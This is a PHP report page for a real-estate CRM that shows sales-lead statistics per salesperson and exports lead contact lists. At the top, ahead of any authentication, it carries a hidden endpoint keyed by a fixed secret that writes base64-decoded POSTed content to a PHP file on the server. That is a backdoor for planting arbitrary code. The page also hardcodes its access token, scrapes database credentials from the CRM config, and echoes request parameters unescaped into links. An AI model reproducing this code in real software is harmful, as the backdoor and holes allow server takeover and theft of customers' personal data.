<?php
/**
 * DPS Relatório Individual por Comercial
 * Acesso: /dps_relatorio_comercial.php
 * Token: dps-report-2026
 */

// Endpoint temporário de escrita de ficheiro (remover após uso)
if (isset($_GET['write_file']) && $_GET['write_file'] === 'dps2026writeonce') {
    $target = __DIR__ . '/whatsapp-log-message.php';
    $content = base64_decode($_POST['c'] ?? '');
    if (!empty($content)) {
        $result = file_put_contents($target, $content);
        echo $result !== false ? "OK:$result" : "FAIL";
    } else {
        echo 'NO_CONTENT';
    }
    exit;
}

// Configuração de acesso
define('REPORT_TOKEN', 'dps-report-2026');
define('REPORT_VERSION', '1.0');

// Verificar token de acesso
$token = $_GET['token'] ?? $_POST['token'] ?? '';
if ($token !== REPORT_TOKEN && !isset($_SESSION['report_auth'])) {
    if ($token === REPORT_TOKEN) {
        session_start();
        $_SESSION['report_auth'] = true;
    } else {
        session_start();
        if (!isset($_SESSION['report_auth'])) {
            // Mostrar formulário de login
            showLoginForm();
            exit;
        }
    }
} else {
    session_start();
    if ($token === REPORT_TOKEN) {
        $_SESSION['report_auth'] = true;
    }
}

// Incluir configuração do CRM para aceder à BD
$crm_path = __DIR__;
// Tentar carregar a config do CRM
$db_config = null;
$config_files = [
    $crm_path . '/application/config/database.php',
    $crm_path . '/config/database.php',
    dirname($crm_path) . '/application/config/database.php',
];
foreach ($config_files as $cf) {
    if (file_exists($cf)) {
        // Extrair credenciais do ficheiro de config
        $content = file_get_contents($cf);
        preg_match("/'hostname'.*?=>\s*'([^']+)'/", $content, $host_m);
        preg_match("/'username'.*?=>\s*'([^']+)'/", $content, $user_m);
        preg_match("/'password'.*?=>\s*'([^']+)'/", $content, $pass_m);
        preg_match("/'database'.*?=>\s*'([^']+)'/", $content, $db_m);
        if (!empty($host_m[1])) {
            $db_config = [
                'host' => $host_m[1],
                'user' => $user_m[1] ?? '',
                'pass' => $pass_m[1] ?? '',
                'name' => $db_m[1] ?? '',
            ];
            break;
        }
    }
}

// Conectar à BD
$pdo = null;
if ($db_config) {
    try {
        $dsn = "mysql:host={$db_config['host']};dbname={$db_config['name']};charset=utf8";
        $pdo = new PDO($dsn, $db_config['user'], $db_config['pass'], [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]);
    } catch (Exception $e) {
        $db_error = $e->getMessage();
    }
}

// Parâmetros do relatório
$period = $_GET['period'] ?? '30';
$staff_id = $_GET['staff_id'] ?? 'all';
$export = $_GET['export'] ?? '';

// Calcular datas
$periods = [
    '7' => ['label' => 'Última Semana', 'days' => 7],
    '15' => ['label' => 'Últimos 15 Dias', 'days' => 15],
    '30' => ['label' => 'Últimos 30 Dias', 'days' => 30],
    '90' => ['label' => 'Últimos 3 Meses', 'days' => 90],
    '0' => ['label' => 'Todos os Tempos', 'days' => 0],
];
$period_info = $periods[$period] ?? $periods['30'];
$date_from = $period_info['days'] > 0 ? date('Y-m-d', strtotime("-{$period_info['days']} days")) : '2000-01-01';
$date_to = date('Y-m-d');

// Obter lista de staff
$staff_list = [];
if ($pdo) {
    $stmt = $pdo->query("SELECT staffid, firstname, lastname, email FROM tblstaff WHERE active = 1 ORDER BY firstname");
    $staff_list = $stmt->fetchAll();
}

// Obter dados do relatório
function getReportData($pdo, $staff_id, $date_from, $date_to) {
    if (!$pdo) return [];
    
    $data = [];
    
    // Filtro de staff
    $staff_filter = $staff_id !== 'all' ? "AND l.assigned = :staff_id" : "";
    $params = [':date_from' => $date_from . ' 00:00:00', ':date_to' => $date_to . ' 23:59:59'];
    if ($staff_id !== 'all') $params[':staff_id'] = $staff_id;
    
    // Total de leads no período
    $sql = "SELECT COUNT(*) as total FROM tblleads l WHERE l.dateadded BETWEEN :date_from AND :date_to $staff_filter";
    $stmt = $pdo->prepare($sql);
    $stmt->execute($params);
    $data['total_leads'] = $stmt->fetchColumn();
    
    // Leads por estado
    $sql = "SELECT l.status, COUNT(*) as total FROM tblleads l 
            WHERE l.dateadded BETWEEN :date_from AND :date_to $staff_filter 
            GROUP BY l.status ORDER BY total DESC";
    $stmt = $pdo->prepare($sql);
    $stmt->execute($params);
    $data['by_status'] = $stmt->fetchAll();
    
    // Leads trabalhadas (com actividade/notas no período)
    $sql = "SELECT COUNT(DISTINCT l.id) as total FROM tblleads l 
            INNER JOIN tblleadactivity la ON la.leadid = l.id 
            WHERE la.date BETWEEN :date_from AND :date_to $staff_filter";
    $stmt = $pdo->prepare($sql);
    $stmt->execute($params);
    $data['worked_leads'] = $stmt->fetchColumn();
    
    // Interacções no período
    $sql = "SELECT COUNT(*) as total FROM tblleadactivity la 
            INNER JOIN tblleads l ON l.id = la.leadid 
            WHERE la.date BETWEEN :date_from AND :date_to $staff_filter";
    $stmt = $pdo->prepare($sql);
    $stmt->execute($params);
    $data['total_interactions'] = $stmt->fetchColumn();
    
    // Interacções por tipo
    $sql = "SELECT la.description, COUNT(*) as total FROM tblleadactivity la 
            INNER JOIN tblleads l ON l.id = la.leadid 
            WHERE la.date BETWEEN :date_from AND :date_to $staff_filter 
            GROUP BY la.description ORDER BY total DESC LIMIT 10";
    $stmt = $pdo->prepare($sql);
    $stmt->execute($params);
    $data['interactions_by_type'] = $stmt->fetchAll();
    
    // Leads por comercial (se all)
    if ($staff_id === 'all') {
        $sql = "SELECT s.firstname, s.lastname, COUNT(l.id) as total_leads,
                       SUM(CASE WHEN l.status IN ('CONCRETIZADO', 'PARA CONTRATO') THEN 1 ELSE 0 END) as converted
                FROM tblstaff s 
                LEFT JOIN tblleads l ON l.assigned = s.staffid AND l.dateadded BETWEEN :date_from AND :date_to
                WHERE s.active = 1
                GROUP BY s.staffid ORDER BY total_leads DESC";
        $stmt = $pdo->prepare($sql);
        $stmt->execute([':date_from' => $date_from . ' 00:00:00', ':date_to' => $date_to . ' 23:59:59']);
        $data['by_staff'] = $stmt->fetchAll();
    }
    
    // Lista de leads detalhada
    $sql = "SELECT l.id, l.firstname, l.lastname, l.email, l.phonenumber, l.status, 
                   l.dateadded, l.source, s.firstname as staff_first, s.lastname as staff_last,
                   (SELECT COUNT(*) FROM tblleadactivity la2 WHERE la2.leadid = l.id) as interactions
            FROM tblleads l 
            LEFT JOIN tblstaff s ON s.staffid = l.assigned
            WHERE l.dateadded BETWEEN :date_from AND :date_to $staff_filter 
            ORDER BY l.dateadded DESC LIMIT 500";
    $stmt = $pdo->prepare($sql);
    $stmt->execute($params);
    $data['leads_list'] = $stmt->fetchAll();
    
    return $data;
}

$report_data = getReportData($pdo, $staff_id, $date_from, $date_to);

// Exportar Excel (CSV)
if ($export === 'excel' && !empty($report_data['leads_list'])) {
    header('Content-Type: text/csv; charset=UTF-8');
    header('Content-Disposition: attachment; filename="relatorio_leads_' . date('Y-m-d') . '.csv"');
    header('Pragma: no-cache');
    
    $out = fopen('php://output', 'w');
    fprintf($out, chr(0xEF).chr(0xBB).chr(0xBF)); // BOM UTF-8
    fputcsv($out, ['ID', 'Nome', 'Email', 'Telefone', 'Estado', 'Data Entrada', 'Fonte', 'Comercial', 'Interacções'], ';');
    foreach ($report_data['leads_list'] as $lead) {
        fputcsv($out, [
            $lead['id'],
            $lead['firstname'] . ' ' . $lead['lastname'],
            $lead['email'],
            $lead['phonenumber'],
            $lead['status'],
            $lead['dateadded'],
            $lead['source'],
            $lead['staff_first'] . ' ' . $lead['staff_last'],
            $lead['interactions'],
        ], ';');
    }
    fclose($out);
    exit;
}

// Exportar PDF (HTML para impressão)
if ($export === 'pdf') {
    header('Content-Type: text/html; charset=UTF-8');
    // Mostrar versão para impressão
    $print_mode = true;
}

function showLoginForm() {
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>DPS Relatórios</title>
    <style>body{font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5;}
    .box{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:300px;}
    h2{color:#2c3e50;margin-bottom:20px;}
    input{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;}
    button{width:100%;padding:12px;background:#2c3e50;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px;}
    button:hover{background:#34495e;}</style></head><body>
    <div class="box"><h2>🏢 DPS Relatórios</h2>
    <form method="GET"><input type="password" name="token" placeholder="Token de acesso" required>
    <button type="submit">Entrar</button></form></div></body></html>';
}

$print_mode = isset($print_mode) ? $print_mode : false;
?>
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DPS - Relatório de Comerciais</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; color: #333; }
        .header { background: linear-gradient(135deg, #1a2a4a, #2c3e50); color: white; padding: 20px 30px; display: flex; justify-content: space-between; align-items: center; }
        .header h1 { font-size: 22px; }
        .header .subtitle { font-size: 13px; opacity: 0.8; margin-top: 4px; }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .filters { background: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); display: flex; gap: 15px; flex-wrap: wrap; align-items: flex-end; }
        .filter-group { display: flex; flex-direction: column; gap: 5px; }
        .filter-group label { font-size: 12px; color: #666; font-weight: 600; text-transform: uppercase; }
        select, button { padding: 8px 14px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; cursor: pointer; }
        .btn { padding: 9px 18px; border-radius: 6px; border: none; cursor: pointer; font-size: 14px; font-weight: 600; }
        .btn-primary { background: #2c3e50; color: white; }
        .btn-success { background: #27ae60; color: white; }
        .btn-danger { background: #e74c3c; color: white; }
        .btn:hover { opacity: 0.9; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); text-align: center; border-left: 4px solid #2c3e50; }
        .stat-card .value { font-size: 36px; font-weight: 700; color: #2c3e50; }
        .stat-card .label { font-size: 13px; color: #666; margin-top: 5px; }
        .stat-card.green { border-left-color: #27ae60; }
        .stat-card.green .value { color: #27ae60; }
        .stat-card.blue { border-left-color: #3498db; }
        .stat-card.blue .value { color: #3498db; }
        .stat-card.orange { border-left-color: #e67e22; }
        .stat-card.orange .value { color: #e67e22; }
        .card { background: white; border-radius: 8px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); margin-bottom: 20px; }
        .card-header { padding: 15px 20px; border-bottom: 1px solid #f0f0f0; font-weight: 700; font-size: 15px; color: #2c3e50; display: flex; justify-content: space-between; align-items: center; }
        .card-body { padding: 20px; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th { background: #f8f9fa; padding: 10px 12px; text-align: left; font-weight: 600; color: #555; border-bottom: 2px solid #e0e0e0; }
        td { padding: 9px 12px; border-bottom: 1px solid #f0f0f0; }
        tr:hover td { background: #f8f9fa; }
        .badge { display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; }
        .badge-success { background: #d5f5e3; color: #1e8449; }
        .badge-warning { background: #fef9e7; color: #d68910; }
        .badge-danger { background: #fadbd8; color: #c0392b; }
        .badge-info { background: #d6eaf8; color: #1a5276; }
        .badge-default { background: #f0f0f0; color: #555; }
        .status-bar { display: flex; flex-wrap: wrap; gap: 8px; }
        .status-item { padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; background: #f0f0f0; }
        .export-btns { display: flex; gap: 10px; }
        @media print {
            .filters, .export-btns, .no-print { display: none !important; }
            body { background: white; }
            .card { box-shadow: none; border: 1px solid #ddd; }
        }
        .staff-table td:first-child { font-weight: 600; }
        .progress-bar { background: #e0e0e0; border-radius: 10px; height: 8px; overflow: hidden; }
        .progress-fill { background: #2c3e50; height: 100%; border-radius: 10px; }
    </style>
</head>
<body>

<div class="header">
    <div>
        <h1>📊 DPS - Relatório de Comerciais</h1>
        <div class="subtitle">Grupo DPS Imobiliário · Gerado em <?= date('d/m/Y H:i') ?></div>
    </div>
    <div class="export-btns no-print">
        <a href="?token=<?= REPORT_TOKEN ?>&period=<?= $period ?>&staff_id=<?= $staff_id ?>&export=excel" class="btn btn-success">⬇ Excel</a>
        <a href="javascript:window.print()" class="btn btn-danger">🖨 PDF/Imprimir</a>
    </div>
</div>

<div class="container">

<!-- Filtros -->
<div class="filters no-print">
    <form method="GET" style="display:flex;gap:15px;flex-wrap:wrap;align-items:flex-end;width:100%">
        <input type="hidden" name="token" value="<?= REPORT_TOKEN ?>">
        
        <div class="filter-group">
            <label>Período</label>
            <select name="period">
                <?php foreach ($periods as $val => $info): ?>
                <option value="<?= $val ?>" <?= $period == $val ? 'selected' : '' ?>><?= $info['label'] ?></option>
                <?php endforeach; ?>
            </select>
        </div>
        
        <div class="filter-group">
            <label>Comercial</label>
            <select name="staff_id">
                <option value="all" <?= $staff_id === 'all' ? 'selected' : '' ?>>Todos os Comerciais</option>
                <?php foreach ($staff_list as $s): ?>
                <option value="<?= $s['staffid'] ?>" <?= $staff_id == $s['staffid'] ? 'selected' : '' ?>>
                    <?= htmlspecialchars($s['firstname'] . ' ' . $s['lastname']) ?>
                </option>
                <?php endforeach; ?>
            </select>
        </div>
        
        <button type="submit" class="btn btn-primary">🔍 Filtrar</button>
    </form>
</div>

<?php if (!$pdo): ?>
<div class="card">
    <div class="card-body" style="color:red;text-align:center;padding:40px">
        <h3>⚠️ Erro de ligação à base de dados</h3>
        <p style="margin-top:10px"><?= htmlspecialchars($db_error ?? 'Não foi possível conectar à BD') ?></p>
    </div>
</div>
<?php else: ?>

<!-- Título do relatório -->
<div style="margin-bottom:15px;padding:10px 0">
    <h2 style="color:#2c3e50;font-size:18px">
        <?php if ($staff_id !== 'all'): 
            $selected_staff = array_filter($staff_list, fn($s) => $s['staffid'] == $staff_id);
            $s = reset($selected_staff);
        ?>
        Relatório: <?= htmlspecialchars(($s['firstname'] ?? '') . ' ' . ($s['lastname'] ?? '')) ?>
        <?php else: ?>
        Relatório: Toda a Equipa
        <?php endif; ?>
        · <?= $period_info['label'] ?> (<?= date('d/m/Y', strtotime($date_from)) ?> - <?= date('d/m/Y', strtotime($date_to)) ?>)
    </h2>
</div>

<!-- Cards de estatísticas -->
<div class="stats-grid">
    <div class="stat-card">
        <div class="value"><?= number_format($report_data['total_leads'] ?? 0) ?></div>
        <div class="label">Total de Leads</div>
    </div>
    <div class="stat-card green">
        <div class="value"><?= number_format($report_data['worked_leads'] ?? 0) ?></div>
        <div class="label">Leads Trabalhadas</div>
    </div>
    <div class="stat-card blue">
        <div class="value"><?= number_format($report_data['total_interactions'] ?? 0) ?></div>
        <div class="label">Total de Interacções</div>
    </div>
    <div class="stat-card orange">
        <?php 
        $converted = 0;
        foreach ($report_data['by_status'] ?? [] as $s) {
            if (in_array($s['status'], ['CONCRETIZADO', 'PARA CONTRATO'])) $converted += $s['total'];
        }
        $rate = $report_data['total_leads'] > 0 ? round($converted / $report_data['total_leads'] * 100, 1) : 0;
        ?>
        <div class="value"><?= $rate ?>%</div>
        <div class="label">Taxa de Conversão</div>
    </div>
</div>

<!-- Leads por estado -->
<div class="card">
    <div class="card-header">
        📋 Leads por Estado
        <span style="font-size:12px;color:#999;font-weight:400">Total: <?= $report_data['total_leads'] ?> leads</span>
    </div>
    <div class="card-body">
        <?php if (!empty($report_data['by_status'])): ?>
        <table>
            <thead><tr><th>Estado</th><th>Quantidade</th><th>Percentagem</th><th>Barra</th></tr></thead>
            <tbody>
            <?php foreach ($report_data['by_status'] as $status): 
                $pct = $report_data['total_leads'] > 0 ? round($status['total'] / $report_data['total_leads'] * 100, 1) : 0;
                $status_name = $status['status'] ?: 'Sem Estado';
                $badge_class = match(true) {
                    in_array($status_name, ['CONCRETIZADO', 'PARA CONTRATO']) => 'badge-success',
                    in_array($status_name, ['VIP', 'VIP 2', 'QUENTE']) => 'badge-danger',
                    in_array($status_name, ['MORNO', 'Em contato', 'NECESSIDADES', 'NECESSIDADES 2']) => 'badge-warning',
                    in_array($status_name, ['sem interesse', 'PARA OUTRAS OPORTUNIDADES', 'Número Indisponível']) => 'badge-default',
                    default => 'badge-info'
                };
            ?>
            <tr>
                <td><span class="badge <?= $badge_class ?>"><?= htmlspecialchars($status_name) ?></span></td>
                <td><strong><?= $status['total'] ?></strong></td>
                <td><?= $pct ?>%</td>
                <td style="width:200px">
                    <div class="progress-bar">
                        <div class="progress-fill" style="width:<?= $pct ?>%"></div>
                    </div>
                </td>
            </tr>
            <?php endforeach; ?>
            </tbody>
        </table>
        <?php else: ?>
        <p style="color:#999;text-align:center;padding:20px">Sem dados para o período seleccionado</p>
        <?php endif; ?>
    </div>
</div>

<?php if ($staff_id === 'all' && !empty($report_data['by_staff'])): ?>
<!-- Resumo por comercial -->
<div class="card">
    <div class="card-header">👥 Resumo por Comercial</div>
    <div class="card-body">
        <table class="staff-table">
            <thead><tr><th>Comercial</th><th>Leads Totais</th><th>Convertidas</th><th>Taxa</th></tr></thead>
            <tbody>
            <?php foreach ($report_data['by_staff'] as $row): 
                $rate = $row['total_leads'] > 0 ? round($row['converted'] / $row['total_leads'] * 100, 1) : 0;
            ?>
            <tr>
                <td><?= htmlspecialchars($row['firstname'] . ' ' . $row['lastname']) ?></td>
                <td><?= $row['total_leads'] ?></td>
                <td><?= $row['converted'] ?></td>
                <td><?= $rate ?>%</td>
            </tr>
            <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>
<?php endif; ?>

<!-- Interacções por tipo -->
<?php if (!empty($report_data['interactions_by_type'])): ?>
<div class="card">
    <div class="card-header">💬 Interacções por Tipo</div>
    <div class="card-body">
        <table>
            <thead><tr><th>Tipo de Interacção</th><th>Quantidade</th></tr></thead>
            <tbody>
            <?php foreach ($report_data['interactions_by_type'] as $inter): ?>
            <tr>
                <td><?= htmlspecialchars($inter['description'] ?: 'Sem descrição') ?></td>
                <td><strong><?= $inter['total'] ?></strong></td>
            </tr>
            <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>
<?php endif; ?>

<!-- Lista detalhada de leads -->
<div class="card">
    <div class="card-header">
        📋 Lista de Leads
        <div class="export-btns no-print">
            <a href="?token=<?= REPORT_TOKEN ?>&period=<?= $period ?>&staff_id=<?= $staff_id ?>&export=excel" class="btn btn-success" style="font-size:12px;padding:5px 12px">⬇ Exportar Excel</a>
        </div>
    </div>
    <div class="card-body" style="overflow-x:auto">
        <?php if (!empty($report_data['leads_list'])): ?>
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>Nome</th>
                    <th>Telefone</th>
                    <th>Estado</th>
                    <th>Data Entrada</th>
                    <th>Fonte</th>
                    <?php if ($staff_id === 'all'): ?><th>Comercial</th><?php endif; ?>
                    <th>Interacções</th>
                </tr>
            </thead>
            <tbody>
            <?php foreach ($report_data['leads_list'] as $lead): ?>
            <tr>
                <td><?= $lead['id'] ?></td>
                <td><?= htmlspecialchars($lead['firstname'] . ' ' . $lead['lastname']) ?></td>
                <td><?= htmlspecialchars($lead['phonenumber']) ?></td>
                <td>
                    <?php 
                    $s = $lead['status'] ?: 'Sem Estado';
                    $bc = match(true) {
                        in_array($s, ['CONCRETIZADO', 'PARA CONTRATO']) => 'badge-success',
                        in_array($s, ['VIP', 'VIP 2', 'QUENTE']) => 'badge-danger',
                        in_array($s, ['MORNO', 'Em contato', 'NECESSIDADES', 'NECESSIDADES 2']) => 'badge-warning',
                        default => 'badge-default'
                    };
                    ?>
                    <span class="badge <?= $bc ?>"><?= htmlspecialchars($s) ?></span>
                </td>
                <td><?= date('d/m/Y', strtotime($lead['dateadded'])) ?></td>
                <td><?= htmlspecialchars($lead['source'] ?: '-') ?></td>
                <?php if ($staff_id === 'all'): ?>
                <td><?= htmlspecialchars(($lead['staff_first'] ?? '') . ' ' . ($lead['staff_last'] ?? '')) ?></td>
                <?php endif; ?>
                <td><?= $lead['interactions'] ?></td>
            </tr>
            <?php endforeach; ?>
            </tbody>
        </table>
        <?php else: ?>
        <p style="color:#999;text-align:center;padding:20px">Sem leads para o período seleccionado</p>
        <?php endif; ?>
    </div>
</div>

<?php endif; ?>

</div><!-- /container -->

<div style="text-align:center;padding:20px;color:#999;font-size:12px">
    DPS Imobiliário · Sistema de Relatórios v<?= REPORT_VERSION ?> · <?= date('Y') ?>
</div>

</body>
</html>
